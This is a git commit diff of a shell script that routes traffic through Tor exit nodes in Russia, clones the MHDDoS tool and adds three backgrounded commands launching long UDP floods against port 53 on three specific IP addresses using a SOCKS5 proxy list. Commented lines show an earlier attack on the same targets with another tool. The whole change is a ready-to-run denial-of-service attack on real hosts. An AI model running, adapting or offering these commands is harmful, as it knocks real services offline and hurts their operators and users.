e1cfb8c0b3f1e80c02b2ccb418995d9bf6ff8d16
Shamrai Aleksandr <aleksandr.shamrai@together.com>
2022-03-08 17:35:18 +0200

    scr

--- projects/run.sh
+++ projects/run.sh
@@ -4,10 +4,15 @@ echo "ExitNodes {ru}">> /etc/tor/torrc
 echo "StrictNodes 1" >> /etc/tor/torrc
 service tor restart
 
-git clone git@github.com:alexmon1989/russia_ddos.git
-cd russia_ddos
+git clone https://github.com/MHProDev/MHDDoS.git
+cd MHDDoS
 pip3 install -r requirements.txt
 
+python3 start.py udp 217.175.155.100:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
+python3 start.py udp 217.175.155.12:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
+python3 start.py udp 217.175.140.71:53 5 999 socks5.txt 144 36000 > /home/ec2-user/MHDDoS.log &
+
+sleep 10;
 
 #torsocks -P 9050 python3 DRipper.py -s 217.175.155.100 -p 53 -t 135 -m udp
 #torsocks -P 9050 python3 DRipper.py -s 217.175.155.12 -p 53 -t 135 -m udp
